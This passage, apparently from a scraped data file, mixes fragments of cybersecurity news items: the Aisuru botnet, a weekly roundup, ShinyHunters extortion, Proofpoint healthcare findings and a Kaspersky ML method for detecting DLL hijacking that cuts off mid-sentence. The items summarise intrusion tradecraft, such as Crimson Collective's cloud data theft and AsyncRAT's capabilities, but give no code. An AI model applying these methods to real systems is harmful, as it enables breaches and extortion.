malicious traffic and make it appear to be coming from regular residential users in the U.S.“The people who operate this botnet are also selling (it as) residential proxies,” he said. “And that’s being used to reflect application layer attacks through the proxies on the bots as well.”The Aisuru botnet harkens back to its predecessor Mirai in another intriguing way. One of its owners is using the Telegram handle “9gigsofram,” which corresponds to the nickname used by the co-owner of a Minecraft server protection service calledProxypipethat washeavily targeted in 2016 by the original Mirai botmasters.Robert Coelhoco-ran Proxypipe back then along with his business partnerErik “9gigsofram” Buckingham, and has spent the past nine years fine-tuning various DDoS mitigation companies that cater to Minecraft server operators and other gaming enthusiasts. Coelho said he has no idea why one of Aisuru’s botmasters chose Buckingham’s nickname, but added that it might say something about how long this person has been involved in the DDoS-for-hire industry.“The Aisuru attacks on the gaming networks these past seven day have been absolutely huge, and you can see tons of providers going down multiple times a day,” Coelho said.Coelho said the 15 Tbps attack this week against TCPShield was likely only a portion of the total attack volume hurled by Aisuru at the time, because much of it would have been shoved through networks that simply couldn’t process that volume of traffic all at once. Such outsized attacks, he said, are becoming increasingly difficult and expensive to mitigate.“It’s definitely at the point now where you need to be spending at least a million dollars a month just to have the network capacity to be able to deal with these attacks,” he said.RAPID SPREADAisuru has long been rumored to use multiple zero-day vulnerabilities in IoT devices to aid its rapid growth over the past year.XLab, the Chinese security company that was thefirst to profile Aisuru’s rise in 2024, warned last month that one of the Aisuru botmasters had compromised the firmware distribution website forTotolink, a maker of low-cost routers and other networking gear.“Multiple sources indicate the group allegedly compromised a router firmware update server in April and distributed malicious scripts to expand the botnet,” XLabwroteon September 15. “The node count is currently reported to be around 300,000.”A malicious script implanted into a Totolink update server in April 2025. Image: XLab.Aisuru’s operators received an unexpected boost to their crime machine in August when theU.S. Department Justicecharged the alleged proprietor ofRapper Bot, a DDoS-for-hire botnet that competed directly with Aisuru for control over the global pool of vulnerable IoT systems.Once Rapper Bot was dismantled, Aisuru’s curators moved quickly to commandeer vulnerable IoT devices that were suddenly set adrift by the government’s takedown, Dobbins said.“Folks were arrested and Rapper Bot control servers were seized and that’s great, but unfortunately the botnet’s attack assets were then pieced out by the remaining botnets,” he said. “The problem is, even if those infected IoT devices are rebooted and cleaned up, they will still get re-compromised by something else generally within minutes of being plugged back in.”A screenshot shared by XLabs showing the Aisuru botmasters recently celebrating a record-breaking 7.7 Tbps DDoS. The user at the top has adopted the name “Ethan J. Foltz” in a mocking tribute to the alleged Rapper Bot operator who was arrested and charged in August 2025.BOTMASTERS AT LARGEXLab’sSeptember blog postcited multiple unnamed sources saying Aisuru is operated by three cybercriminals: “Snow,” who’s responsible for botnet development; “Tom,” tasked with finding new vulnerabilities; and “Forky,” responsible for botnet sales.KrebsOnSecurity interviewed Forky in ourMay 2025 storyabout the record 6.3 Tbps attack from Aisuru. That story identified Forky as a 21-year-old man from Sao Paulo, Brazil who has been extremely active in the DDoS-for-hire scene since at least 2022. The FBI has seized Forky’s DDoS-for-hire domains several times over the years.Like the original Mirai botmasters, Forky also operates a DDoS mitigation service calledBotshield. Forky declined to discuss the makeup of his ISP’s clientele, or to clarify whether Botshield was more of a hosting provider or a DDoS mitigation firm. However, Forky has posted on Telegram about Botshield successfully mitigating large DDoS attacks launched against other DDoS-for-hire services.In our previous interview, Forky acknowledged being involved in the development and marketing of Aisuru, but denied participating in attacks launched by the botnet.Reached for comment earlier this month, Forky continued to maintain his innocence, claiming that he also is still trying to figure out who the current Aisuru botnet operators are in real life (Forky said the same thing in our May interview).But after a week of promising juicy details, Forky came up empty-handed once again. Suspecting that Forky was merely being coy, I asked him how someone so connected to the DDoS-for-hire world could still be mystified on this point, and suggested that his inability or unwillingness to blame anyone else for Aisuru would not exactly help his case.At this, Forky verbally bristled at being pressed for more details, and abruptly terminated our interview.“I’m not here to be threatened with ignorance because you are stressed,” Forky replied. “They’re blaming me for those new attacks. Pretty much the whole world (is) due to your blog.”",
      "summary": "The Aisuru botnet has recently demonstrated significant growth in its capabilities, launching record-breaking DDoS attacks that have disrupted major Internet Service Providers (ISPs) and affected numerous online gaming services. These attacks are primarily targeting U.S.-based ISPs like AT&T, Comcast, and Verizon, exploiting a large number of compromised IoT devices to generate massive amounts of junk traffic. The Aisuru botnet's recent attack on an ISP named TCPShield is particularly notable for its scale, with over 15 terabits per second of data being sent through the network, causing significant congestion and service degradation.",

      "content": "The Good | Teens Arrested in Nursery Doxing Case as OpenAI Disrupts Cybercrime ClustersU.K. police havearrestedtwo 17-year-olds in Hertfordshire for allegedlydoxingchildrenfollowing a ransomware attack on London-based Kido nurseries. The Radiant Group claimed responsibility, saying they stole sensitive data and photos of over 8000 children and leaked some online to extort Kido. Later, the files were removed after the groups’ threats to both Kido and parents of the affected children failed to make headway. Kido, supporting over 15,000 families in the U.K, U.S, China, and India,confirmedthe breached data was hosted by Famly, a nursery software platform, which said its systems were not compromised.The UK’s NCSCcalledthe attack on children “particularly egregious” and the Met Police emphasized their commitment to bringing the perpetrators to justice. The arrests reflect a wider trend of teenagers involved in major U.K. cyberattacks, with recent cases linked toMarks & Spencer, Co-op, Harrods, and Transport for London.Also this week,OpenAI said itdisruptedthree malicious activity clusters abusing ChatGPT for cybercrime and influence operations. The first involved Russian-speaking actors using multiple accounts to develop components of remote access trojans (RATs),credential stealers, anddata exfiltrationtools. The second, tied to North Korean actors, used ChatGPT to assist in malware,phishing, andC2development – using the chatbot to draft copy, perform experiments, and explore new techniques. The third was linked to Chinese threat group ‘UNK_DropPitch’, which leveraged the tool to create multilingual phishing content and automate hacking tasks.Beyond these, OpenAI also blocked networks from Cambodia, Myanmar, Nigeria, Russia, and China for usingAIin scams, propaganda, andsurveillance, though all mentioned actors tried to mask signs of their abuse of the tool to further their operations.The Bad | Crimson Collective Group Breach Cloud Systems to Steal Data & Extort VictimsA threat group called‘Crimson Collective’ has launched a series of targeted attacks on AWS cloud environments, stealing sensitive data andextortingvictims through multi-stage intrusions. The group just recentlyexfiltrated570 GB of data from thousands of private GitLab repositories before joining forces withScattered Lapsus$ Huntersto intensify its extortion efforts.Researchersexplainhow Crimson Collective’s operations begin with harvesting exposed long-term access credentials using open-source tools like TruffleHog. Once inside, they create new privileged accounts andescalate privilegesby assigning administrative policies, effectively gaining complete control over the compromised environment. Here, the attackers enumerate users, databases, and storage systems in preparation of large-scale data theft.The group’s exfiltration process involves modifying database master passwords, creating snapshots of databases before exporting them to S3 for transfer through API calls. EBS (Elastic Block Store) volumes are then launched and attached under permissive security groups to move data more freely. Victims typically receive ransom demands via in-platform email systems and external addresses once exfiltration is complete.Extortion note from Crimson Collective (Source: Rapid7)Investigations found that the group employs many IP addresses, some reused across different incidents, which allowed partial tracking of its operations. While Crimson Collective’s size and infrastructure remain unclear, its extortion tactics indicate an expanding threat to organizations relying oncloud-basedinfrastructure.Usingshort-term, least-privileged credentials and enforcing IAM policies can help mitigate the chance of breaches.Researchers warn that leaked credentials and lax privilege management continue to be major enablers for these attacks, and urge companies to tighten access controls, limit credential lifespan, and regularly audit for exposed secrets using open-source scanning tools.The Ugly | Attackers Breach Discord Ticketing Support, Exposing Data of 5.5M UsersThreat actors claiming to have breached Discord’s customer support systems are now threatening to leak dataallegedly stolen from millions of users after the company refused to pay ransom demands. This latest threat follows reports that the attackers first gained access to a third-party support provider in late September, exfiltratingsensitive user informationsuch as names, emails, government IDs, and partial payment details.Discordconfirmedthat the compromise affected a vendor system used for customer service, not its internal infrastructure, and said around 70,000 users had their government ID photos exposed – far fewer than the 2.1 million claimed by the attackers. The company stressed that inflated figures and ransom demands were part of an extortion campaign and that it will not reward illegal actions.According to the threat actors, they accessed Discord’s support platform for 58 hours through a compromised account belonging to an outsourced support agent.During this window, the scope of their claim includes 1.6 terabytes of data, including 8.4 million support tickets affecting 5.5 million users, with roughly 580,000 containing partial payment information. The attackers also said integrations between the support system and Discord’s internal database allowed them to run millions of API queries for additional user data.The actors initially demanded $5 million, later reducing it to $3.5 million before Discord ended negotiations and went public with the breach. The group has since threatened to release the stolen data, marking one of the largest extortion-driven data thefts to hit a major communication platform in 2025.",

Those aren’t abstract numbers—they represent disrupted surgeries, delayed lab results and ER doctors locked out of digital records when seconds matter most.\n“Patient safety is inseparable from cyber safety,” said\nRyan Witt\n, Proofpoint’s healthcare leader. “When care is delayed, disrupted, or compromised due to a cyberattack, patient outcomes are impacted, and lives are potentially put at risk.”\nThe Human Cost Behind the Metrics\nAcross ransomware, business email compromise, cloud/account compromise and supply-chain attacks, 72 percent of affected organizations said patient care was disrupted. More than half saw longer hospital stays or more complications. Nearly a third reported higher mortality.\nWe often talk about “critical infrastructure” as if it’s a collection of wires and servers, but here it’s literally human infrastructure—nurses, physicians, technicians—who can’t safely deliver care when systems go dark. The average cost of a major attack dropped to $3.9 million from $4.7 million, but that’s cold comfort when ransom payments rose to $1.2 million and the true cost is measured in missed diagnoses.\nMORE FOR YOU\nThe Expanding Blast Radius\nOne thing that stood out to me is how quickly everyday collaboration tools have become high-risk surfaces. Texting, video calls and email—essential for coordinating care—were the most attacked channels. This echoes what I’ve heard in conversations with CISOs and clinical IT leaders: the closer technology gets to the patient, the thinner the security margin becomes.\nSupply-chain compromises declined slightly this year, yet they remain the most dangerous, disrupting care in 87 percent of cases. When a lab system or device-update pipeline breaks, you can’t simply “failover” to a manual backup. There is no paper version of an MRI.\nScott Crawford\n, head of information security research at 451 Research / S&P Global, told me that this spotlight on healthcare is long overdue. “Healthcare is—and ought to be—a major focus of cybersecurity, for a host of reasons,” he said. “The criticality to life and safety of healthcare technology, the highly sensitive nature of both patient and practitioner information, and the impact on finance at virtually every level make these exposures an attractive target.”\nHe emphasized that providers have a mandate to make security assurance accessible “from the largest healthcare entities to smaller clinics and practices, and ultimately for everyone who interacts with healthcare systems—and that means everyone.” In a world where attackers exploit the weakest link, protecting a small rural clinic is protecting the entire healthcare ecosystem.\nThe Ransomware Reality\nRansomware remains the defining threat. The\nProofpoint–Ponemon study found\nthat while fewer victims are paying, the price of those who do continues to rise. IDC’s\nMichelle Abraham\nstressed that their own data tells a similar story. She added, “AI-powered analytics can enhance cybersecurity by forecasting potential vulnerabilities and attack vectors, enabling proactive risk management rather than relying on reactive incident response.“\nIt’s a reminder that the healthcare sector’s problem isn’t just too many alerts—it’s too little foresight.\nInsider Risk and Everyday Errors\nNot all incidents are headline-grabbing ransomware attacks. Ninety-six percent of organizations reported at least two data-loss or exfiltration events in the past two years, mostly from insiders—often unintentional ones. A mis-addressed email containing patient records can have the same regulatory and reputational impact as a full-scale breach. More than half of these incidents disrupted care; some correlated with higher mortality. It’s the kind of statistic that should make every hospital board rethink what “cyber risk” means.\nThe AI Paradox\nAI adoption is rising fast in healthcare security. Over half of providers are embedding AI into defensive workflows, and many say it’s improving response times. Yet 60 percent admit they’re struggling to protect the sensitive data used to train those systems. I’ve written before about\nAI’s “double-edged sword”\nin cybersecurity—this is that concept playing out in real time. The same automation that accelerates detection can also magnify data-handling mistakes if governance lags behind.\nMelinda Marks\n, cybersecurity practice director at Omdia, notes that this tension reflects a skills and resource gap. “Our research shows that organizations face challenges with skill sets and resources to help with data resilience and cybersecurity, including the need to discover, classify and protect sensitive data,” she said. “This is particularly challenging in healthcare to protect sensitive patient information and effectively manage access for vital services, where not being able to access information could be life-threatening, and attackers always look for weak spots for entry to steal valuable data.”\nThat’s the paradox of AI in healthcare: it can make care faster and more reliable, but it also raises the stakes if data governance falters.\nLessons From the Front Lines\nThree themes emerge from the report that I see echoed across industries:\nIdentity is the new perimeter.\nPhishing-resistant MFA and continuous access monitoring aren’t optional when clinical collaboration runs on text and video apps.\nHuman error must be anticipated, not blamed.\nSimulation training helps, but pairing it with adaptive policies—like context-aware data-loss prevention—makes mistakes survivable instead of catastrophic.\nResilience is the new compliance.\nHealthcare can’t wait for an auditor’s checklist to prove readiness. True resilience means testing how long you can safely operate when every screen goes blank. If the answer is “minutes,” then the plan isn’t ready.\nDr. Larry Ponemon\nsummed it up bluntly: “Cyberattacks are now routinely affecting patient safety, and while security spending is up, many organizations still lack clear leadership and internal expertise to meet the challenge.”\nThat gap—between spending and capability—is where the real danger lies. Technology investment without strategy is just an expensive illusion of safety.\nTrust Is the Real Metric\nIn healthcare, uptime is measured in lives.\nPatients don’t think about identity-access logs or EDR telemetry; they expect that their doctor can see their chart and their treatment will start on time. That invisible confidence—that trust—is the ultimate indicator of cyber maturity.\nIf there’s one takeaway from this year’s findings, it’s that cybersecurity is no longer an IT discipline supporting care; it is care. The hospitals that internalize that will define what “patient safety” means in a digital era.\nEditorial Standards\nReprints & Permissions",

      "content": "A cybercriminal group that used voice phishing attacks to siphon more than a billion records fromSalesforcecustomers earlier this year has launched a website that threatens to publish data stolen from dozens of Fortune 500 firms if they refuse to pay a ransom. The group also claimed responsibility for a recent breach involvingDiscorduser data, and for stealing terabytes of sensitive files from thousands of customers of the enterprise software makerRed Hat.The new extortion website tied to ShinyHunters (UNC6040), which threatens to publish stolen data unless Salesforce or individual victim companies agree to pay a ransom.In May 2025, a prolific and amorphous English-speaking cybercrime group known asShinyHunterslaunched a social engineering campaign that used voice phishing to trick targets into connecting a malicious app to their organization’s Salesforce portal.The first real details about the incident came in early June, when theGoogle Threat Intelligence Group(GTIG)warnedthat ShinyHunters — tracked by Google asUNC6040— was extorting victims over their stolen Salesforce data, and that the group was poised to launch a data leak site to publicly shame victim companies into paying a ransom to keep their records private. A month later, Google acknowledged that one of its own corporate Salesforce instances was impacted in the voice phishing campaign.Last week, a new victim shaming blog dubbed “Scattered LAPSUS$ Hunters” began publishing the names of companies that had customer Salesforce data stolen as a result of the May voice phishing campaign.“Contact us to negotiate this ransom or all your customers data will be leaked,” the website stated in a message to Salesforce. “If we come to a resolution all individual extortions against your customers will be withdrawn from. Nobody else will have to pay us, if you pay, Salesforce, Inc.”Below that message were more than three dozen entries for companies that allegedly had Salesforce data stolen, includingToyota,FedEx,Disney/Hulu, andUPS. The entries for each company specified the volume of stolen data available, as well as the date that the information was retrieved (the stated breach dates range between May and September 2025).Image: Mandiant.On October 5, the Scattered LAPSUS$ Hunters victim shaming and extortion blog announced that the group was responsible for a breach in September involving a GitLab server used by Red Hat that contained more than 28,000 Git code repositories, including more than 5,000 Customer Engagement Reports (CERs).“Alot of folders have their client’s secrets such as artifactory access tokens, git tokens, azure, docker (redhat docker, azure containers, dockerhub), their client’s infrastructure details in the CERs like the audits that were done for them, and a whole LOT more, etc.,” the hackers claimed.Their claims came several days after a previously unknown hacker group calling itself theCrimson Collectivetook credit for the Red Hat intrusion on Telegram.Red Hatdisclosed on October 2that attackers had compromised a company GitLab server, and said it was in the process of notifying affected customers.“The compromised GitLab instance housed consulting engagement data, which may include, for example, Red Hat’s project specifications, example code snippets, internal communications about consulting services, and limited forms of business contact information,” Red Hat wrote.Separately, Discord has started emailing users affected by another breach claimed by ShinyHunters. Discordsaidan incident on September 20 at a “third-party customer service provider” impacted a “limited number of users” who communicated with Discord customer support or Trust & Safety teams. The information included Discord usernames, emails, IP address, the last four digits of any stored payment cards, and government ID images submitted during age verification appeals.The Scattered Lapsus$ Hunters claim they will publish data stolen from Salesforce and its customers if ransom demands aren’t paid by October 10. The group also claims it will soon begin extorting hundreds more organizations that lost data in August after a cybercrime group stolevast amounts of authentication tokens fromSalesloft, whose AI chatbot is used by many corporate websites to convert customer interaction into Salesforce leads.In a communication sent to customers today, Salesforce emphasized that the theft of any third-party Salesloft data allegedly stolen by ShinyHunters did not originate from a vulnerability within the core Salesforce platform. The company also stressed that it has no plans to meet any extortion demands.“Salesforce will not engage, negotiate with, or pay any extortion demand,” the message to customers read. “Our focus is, and remains, on defending our environment, conducting thorough forensic analysis, supporting our customers, and working with law enforcement and regulatory authorities.”The GTIG tracked the group behind the Salesloft data thefts asUNC6395, and says the group has been observed harvesting the data for authentication tokens tied to a range of cloud services like Snowflake and Amazon’s AWS.Google catalogs Scattered Lapsus$ Hunters by so many UNC names (throw inUNC6240for good measure) because it is thought to be an amalgamation of three hacking groups —Scattered Spider, Lapsus$ and ShinyHunters. The members of these groups hail from many of the same chat channels on theCom, a mostly English-language cybercriminal community that operates across an ocean of Telegram and Discord servers.The Scattered Lapsus$ Hunters darknet blog is currently offline. The outage appears to have coincided with the disappearance of the group’s new clearnet blog —breachforums[.]hn— which vanished after shifting its Domain Name Service (DNS) servers from DDoS-Guard to Cloudflare.But before it died, the websites disclosed that hackers were exploiting a critical zero-day vulnerability inOracle’s E-Business Suitesoftware. Oracle has sinceconfirmedthat a security flaw tracked asCVE-2025-61882allows attackers to perform unauthenticated remote code execution, and is urging customers to apply an emergency update to address the weakness.Mandiant’sCharles Carmakalshared on LinkedInthat CVE-2025-61882 was initially exploited in August 2025 by the Clop ransomware gang to steal data from Oracle E-Business Suite servers.Bleeping Computerwritesthat news of the Oracle zero-day first surfaced on the Scattered Lapsus$ Hunters blog, which published a pair of scripts that were used to exploit vulnerable Oracle E-Business Suite instances.On Monday evening, KrebsOnSecurity received a malware-laced message from a reader that threatened physical violence unless their unstated demands were met. The missive, titled “Shiny hunters,” contained the hashtag $LAPSU$$SCATEREDHUNTER, and urged me to visit a page on limewire[.]com to view their demands.A screenshot of the phishing message linking to a malicious trojan disguised as a Windows screensaver file.KrebsOnSecurity did not visit this link, but instead forwarded it to Mandiant, which confirmed that similar menacing missives were sent to employees at Mandiant and other security firms around the same time.The link in the message fetches a malicious trojan disguised as a Windows screensaver file (Virustotal’s analysis on this malware ishere). Simply viewing the booby-trapped screensaver on a Windows PC is enough to cause the bundled trojan to launch in the background.Mandiant’sAustin Larsensaid the trojan is a commercially available backdoor known asASYNCRAT, a .NET-based backdoor that communicates using a custom binary protocol over TCP, and can execute shell commands and download plugins to extend its features.A scan of the malicious screensaver file at Virustotal.com shows it is detected as bad by nearly a dozen security and antivirus tools.“Downloaded plugins may be executed directly in memory or stored in the registry,” Larsen wrote in an analysis shared via email. “Capabilities added via plugins include screenshot capture, file transfer, keylogging, video capture, and cryptocurrency mining. ASYNCRAT also supports a plugin that targets credentials stored by Firefox and Chromium-based web browsers.”Malware-laced targeted emails are not out of character for certain members of the Scattered Lapsus$ Hunters, who have previously harassed and threatened security researchers and even law enforcement officials who are investigating and warning about the extent of their attacks.With so many big data breaches and ransom attacks now coming from cybercrime groups operating on the Com, law enforcement agencies on both sides of the pond are under increasing pressure to apprehend the criminal hackers involved. In late September, prosecutors in the U.K. charged two alleged Scattered Spider members aged 18 and 19 withextorting at least $115 million in ransom paymentsfrom companies victimized by data theft.U.S. prosecutors heaped their own charges on the 19 year-old in that duo — U.K. residentThalha Jubair— who is alleged to have been involved in data ransom attacks againstMarks & SpencerandHarrods, the British food retailerCo-op Group, and the 2023 intrusions atMGM ResortsandCaesars Entertainment. Jubair also was allegedly a key member of LAPSUS$, a cybercrime group that broke into dozens of technology companies beginning in late 2021.A Mastodon post by Kevin Beaumont, lamenting the prevalence of major companies paying millions to extortionist teen hackers, refers derisively to Thalha Jubair as a part of an APT threat known as “Advanced Persistent Teenagers.”In August, convicted Scattered Spider member and 20-year-old Florida manNoah Michael Urbanwassentenced to 10 years in federal prisonand ordered to pay roughly $13 million in restitution to victims.In April 2025, a 23-year-old Scottish man thought to be an early Scattered Spider member wasextradited from Spain to the U.S., where he is facing charges of wire fraud, conspiracy and identity theft. U.S. prosecutors allegeTyler Robert Buchananand co-conspirators hacked into dozens of companies in the United States and abroad, and that he personally controlled more than $26 million stolen from victims.Update, Oct. 8, 8:59 a.m. ET:A previous version of this story incorrectly referred to the malware sent by the reader as a Windows screenshot file. Rather, it is a Windows screensaver file.",

      "content": "Nearly Three in Four U.S. Healthcare Organizations Report Patient Care Disruption Due to Cyber Attacks, According to New Proofpoint-Ponemon Institute Report\nOctober 07, 2025\nFourth annual report reveals persistent cyber threats are clinical risks as attacks continue to compromise patient safety and cost millions\nSUNNYVALE, Calif. – October 8, 2025 –\nProofpoint, Inc.\n, a leading cybersecurity and compliance company, and Ponemon Institute, a top IT security research organization, today released findings from their fourth annual survey on the effects of cybersecurity in healthcare. The report, “\nCyber Insecurity in Healthcare: The Cost and Impact on Patient Safety and Care 2025\n,” confirms a troubling reality: cyber threats targeting healthcare organizations are not just IT security issues—they can pose serious risks to patient safety and can impact clinical outcomes.\nThe report reveals that 72% of healthcare organizations that experienced common cyberattacks—ransomware, cloud compromise, supply chain attacks, and business email compromise (BEC)—suffered disruption to patient care, up from 69% last year. These attacks are not merely operational nuisances: 54% of impacted organizations reported increased medical procedure complications, 53% reported longer patient stays, and 29% said mortality rates rose as a direct result.\n“Patient safety is inseparable from cyber safety,” said Ryan Witt, vice president of industry solutions at Proofpoint. “This year’s report highlights a stark reality: cyber threats aren’t just IT issues, they’re clinical risks. When care is delayed, disrupted, or compromised due to a cyberattack, patient outcomes are impacted, and lives are potentially put at risk. This report underscores the urgent need for healthcare organizations to adopt a human-centric cybersecurity approach—one that not only protects systems and data but also preserves the continuity and quality of care.”\nCyberattacks Are Endangering Lives and Burdening Operations\nThis year’s report, which surveyed 677 U.S.-based IT and cybersecurity professionals in healthcare, sheds light on the operational, clinical, and financial toll of cyber threats in a sector where human lives are at stake:\n93% of organizations experienced at least one cyberattack in the past year, with an average of 43 attacks per organization, up from 40 in 2024.\nWhile the average cost of the most significant attack decreased to $3.9 million (down from $4.7 million in 2024), cyberattacks remain a major financial burden, driven by downtime, staff productivity loss, and remediation.\nRansomware attacks remain prevalent and increasingly costly. 33% of victims paid ransom demands, but the average payment increased to $1.2 million, up from $1.1 million in 2024, and a staggering 60% higher than in 2022.\nSupply Chain, BEC, and Cloud Attacks Threaten Patient Safety and Care\nAmong the four major attack types analyzed, supply chain attacks were the most likely to impact patient care. Although fewer organizations experienced a supply chain attack in 2025 (44% vs. 68% in 2024), 87% of those affected reported care disruption, an increase from 82% last year. Additionally:\nBEC attacks were most likely to cause delays in procedures and tests that resulted in poor outcomes (65%).\nRansomware was the attack type most likely to result in longer lengths of stay (67%) and increase in patients diverted or transferred to other facilities (50%).\nCloud/account compromises, the most prevalent and persistent threat vector, were experienced by 72% of organizations. 61% reported increased complications in procedures and 36% reported higher mortality, underscoring the urgency of addressing cloud/account compromise risks given the potential impact on patient care and service continuity.\nHuman Risk and Data Loss Threaten Patient Safety\nInsider risk and employee negligence remain persistent challenges:\n96% of organizations have experienced at least two incidents of data loss or exfiltration involving sensitive and confidential healthcare data over the past two years.\nOn average, 18 such incidents occurred per organization. 55% of respondents said these incidents disrupted patient care; of these, 54% saw increased mortality rates, and 36% said it caused delays in procedures and tests that resulted in poor outcomes.\nThe top causes of data loss included: employee failure to follow policies (35%), privileged access abuse (25%), and employees unintentionally sending PII or PHI to the wrong recipient via email (25%).\nDespite these risks, there is evidence of growing maturity: 76% of organizations take steps to address the risk of employees’ lack of awareness about cybersecurity threats (up from 71% in 2024). Of these, 63% conduct regular training and awareness programs and 47% use phishing simulations to improve employee resilience.\nCloud Migration and Mobile App Risks on the Rise\nThe 2025 report also captures trends around healthcare’s digital transformation, with an accelerating shift toward cloud-hosted clinical systems.\n30% of healthcare organizations have already migrated clinical applications to the cloud, with another 32% planning to do so within two years.\nThe most frequently targeted collaboration tools remain text messaging (59%), videoconferencing (54%), and email (45%), underscoring the risks associated with cloud-based collaboration platforms in healthcare environments.\nMeanwhile, insecure mobile apps (eHealth) remain the top cyber concern (55%), followed by employee-owned mobile devices (49%) and cloud/account compromise (49%).\nAI Emerges as a Key Line of Defense—and Risk\nArtificial intelligence is playing a growing role in healthcare security strategy:\n57% of organizations have embedded AI in either cybersecurity (30%) or both cybersecurity and patient care (27%).\n55% say AI is very effective in improving their cybersecurity posture, and 40% use AI/ML to understand human behavior, especially in relation to email protection.\nAI-based data loss prevention (DLP) is gaining traction: 23% of organizations currently use it, with 29% planning to adopt it within a year.\nYet challenges remain: 60% of organizations struggle to protect sensitive data used by AI systems, and interoperability and data accuracy are key barriers to adoption. 38% identified generative AI tools as a cyber concern, a new category in this year’s survey.\nCalls for Leadership and Expertise Grow Louder\nA significant number of respondents cite lack of in-house expertise (43%) and absence of clear leadership (40%) as the main roadblocks to an effective cybersecurity posture. However, budget concerns are declining: only 37% see it as a barrier, down from 40% last year. The average IT budget reported was $65 million, with 21% allocated to information security.\n“This year’s findings are a wake-up call for the healthcare industry; the root cause of many incidents lies in human factors—negligence, insider risk, and gaps in cyber awareness,” said Dr. Larry Ponemon, chairman and founder of the Ponemon Institute. “Cyberattacks are now routinely affecting patient safety, and while security spending is up, many organizations still lack clear leadership and internal expertise to meet the challenge.”\nTo download “Cyber Insecurity in Healthcare: The Cost and Impact on Patient Safety and Care 2025,” please visit:\nhttps://www.proofpoint.com/us/resources/threat-reports/ponemon-healthcare-cybersecurity-report\n###\nAbout Proofpoint, Inc.\nProofpoint, Inc. is a global leader in human- and agent-centric cybersecurity, securing how people, data and AI agents connect across email, cloud and collaboration tools.

      "content": "DLL hijacking is a common technique in which attackers replace a library called by a legitimate process with a malicious one. It is used by both creators of mass-impact malware, like stealers and banking Trojans, and by APT and cybercrime groups behind targeted attacks. In recent years, the number of DLL hijacking attacks has grown significantly.Trend in the number of DLL hijacking attacks. 2023 data is taken as 100% (download)We have observed this technique and its variations, like DLL sideloading, in targeted attacks on organizations inRussia,Africa,South Korea, and other countries and regions.Lumma, one of 2025’s most active stealers, uses this method for distribution. Threat actors trying to profit from popular applications, such as DeepSeek, alsoresortto DLL hijacking.Detecting a DLL substitution attack is not easy because the library executes within the trusted address space of a legitimate process. So, to a security solution, this activity may look like a trusted process. Directing excessive attention to trusted processes can compromise overall system performance, so you have to strike a delicate balance between a sufficient level of security and sufficient convenience.Detecting DLL hijacking with a machine-learning modelArtificial intelligence can help where simple detection algorithms fall short. Kaspersky has been using machine learning for 20 years to identify malicious activity at various stages. The AI expertise center researches the capabilities of different models in threat detection, then trains and implements them. Our colleagues at the threat intelligence center approached us with a question of whether machine learning could be used to detect DLL hijacking, and more importantly, whether it would help improve detection accuracy.PreparationTo determine if we could train a model to distinguish between malicious and legitimate library loads, we first needed to define a set of features highly indicative of DLL hijacking. We identified the following key features:Wrong library location.Many standard libraries reside in standard directories, while a malicious DLL is often found in an unusual location, such as the same folder as the executable that calls it.Wrong executable location.Attackers often save executables in non-standard paths, like temporary directories or user folders, instead of %Program Files%.Renamed executable.To avoid detection, attackers frequently save legitimate applications under arbitrary names.Library size has changed, and it is no longer signed.Modified library structure.Training sample and labelingFor the training sample, we used dynamic library load data provided by our internal automatic processing systems, which handle millions of files every day, and anonymized telemetry, such as that voluntarily provided by Kaspersky users through Kaspersky Security Network.The training sample was labeled in three iterations. Initially, we could not automatically pull event labeling from our analysts that indicated whether an event was a DLL hijacking attack. So, we used data from our databases containing only file reputation, and labeled the rest of the data manually. We labeled as DLL hijacking those library-call events where the process was definitively legitimate but the DLL was definitively malicious. However, this labeling was not enough because some processes, like “svchost”, are designed mainly to load various libraries. As a result, the model we trained on this data had a high rate of false positives and was not practical for real-world use.In the next iteration, we additionally filtered malicious libraries by family, keeping only those which were known to exhibit DLL-hijacking behavior. The model trained on this refined data showed significantly better accuracy and essentially confirmed our hypothesis that we could use machine learning to detect this type of attacks.At this stage, our training dataset had tens of millions of objects. This included about 20 million clean files and around 50,000 definitively malicious ones.StatusTotalUnique filesUnknown~ 18M~ 6MMalicious~ 50K~ 1,000Clean~ 20M~ 250KWe then trained subsequent models on the results of their predecessors, which had been verified and further labeled by analysts. This process significantly increased the efficiency of our training.Loading DLLs: what does normal look like?So, we had a labeled sample with a large number of library loading events from various processes. How can we describe a “clean” library? Using a process name + library name combination does not account for renamed processes. Besides, a legitimate user, not just an attacker, can rename a process. If we used the process hash instead of the name, we would solve the renaming problem, but then every version of the same library would be treated as a separate library. We ultimately settled on using a library name + process signature combination. While this approach considers all identically named libraries from a single vendor as one, it generally produces a more or less realistic picture.To describe safe library loading events, we used a set of counters that included information about the processes (the frequency of a specific process name for a file with a given hash, the frequency of a specific file path for a file with that hash, and so on), information about the libraries (the frequency of a specific path for that library, the percentage of legitimate launches, and so on), and event properties (that is, whether the library is in the same directory as the file that calls it).The result was a system with multiple aggregates (sets of counters and keys) that could describe an input event. These aggregates can contain a single key (e.g., a DLL’s hash sum) or multiple keys (e.g., a process’s hash sum + process signature). Based on these aggregates, we can derive a set of features that describe the library loading event. The diagram below provides examples of how these features are derived:Feature extraction from aggregatesLoading DLLs: how to describe hijackingCertain feature combinations (dependencies) strongly indicate DLL hijacking. These can be simple dependencies. For some processes, the clean library they call always resides in a separate folder, while the malicious one is most often placed in the process folder.Other dependencies can be more complex and require several conditions to be met. For example, a process renaming itself does not, on its own, indicate DLL hijacking. However, if the new name appears in the data stream for the first time, and the library is located on a non-standard path, it is highly likely to be malicious.Model evolutionWithin this project, we trained several generations of models. The primary goal of the first generation was to show that machine learning could at all be applied to detecting DLL hijacking. When training this model, we used the broadest possible interpretation of the term.The model’s workflow was as simple as possible:We took a data stream and extracted a frequency description for selected sets of keys.We took the same data stream from a different time period and obtained a set of features.We used type 1 labeling, where events in which a legitimate process loaded a malicious library from a specified set of families were marked as DLL hijacking.We trained the model on the resulting data.First-generation model diagramThe second-generation model was trained on data that had been processed by the first-generation model and verified by analysts (labeling type 2). Consequently, the labeling was more precise than during the training of the first model. Additionally, we added more features to describe the library structure and slightly complicated the workflow for describing library loads.Second-generation model diagramBased on the results from this second-generation model, we were able to identify several common types of false positives. For example, the training sample included potentially unwanted applications. These can, in certain contexts, exhibit behavior similar to DLL hijacking, but they are not malicious and rarely belong to this attack type.We fixed these errors in the third-generation model. First, with the help of analysts, we flagged the potentially unwanted applications in the training sample so the model would not detect them. Second, in this new version, we used an expanded labeling that included useful detections from both the first and second generations. Additionally, we expanded the feature description through one-hot encoding — a technique for converting categorical features into a binary format — for certain fields. Also, since the volume of events processed by the model increased over time, this version added normalization of all features based on the data flow 